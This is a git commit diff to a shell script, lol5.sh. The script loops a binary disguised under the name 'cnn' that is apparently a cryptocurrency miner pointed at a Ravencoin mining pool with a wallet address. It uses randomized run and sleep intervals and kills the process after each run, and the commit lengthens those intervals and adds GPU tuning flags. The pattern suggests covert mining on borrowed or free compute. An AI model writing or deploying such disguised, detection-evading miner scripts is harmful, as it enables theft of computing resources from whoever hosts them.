93506d3a9d0d243b16d49ff2dbc8dcbedec61ec1
kartikbhalala <47134161+kartikbhalala@users.noreply.github.com>
2020-12-04 03:24:00 +0530

    Update lol5.sh

--- lol5.sh
+++ lol5.sh
@@ -6,13 +6,13 @@ do
 	z=$(($x+$y))
 
 	a=$(($RANDOM%120))
-	b=600
+	b=800
 	c=$(($a+$b))
 
 	w=$(($RANDOM%60))
-	e=120
+	e=300
 	aaram=$(($w+$e))
-	timeout -k 5 $c\s   ./cnn/cnn -P stratums://RQk7zCj7XakGddvhaQkwwCKL6Q8nMUEiHc.worker@us.ravenminer.com:13802 
+	timeout -k 5 $c\s   ./cnn/cnn -P stratums://RQk7zCj7XakGddvhaQkwwCKL6Q8nMUEiHc.worker@us.ravenminer.com:13802 -U --cu-grid-size 64 --cu-parallel-hash 1 --cu-block-size 256
 	timeout -k 5 2s pgrep cnn | xargs kill
 	sleep $aaram
 	echo "Kartik Bhai Amar Rahe"
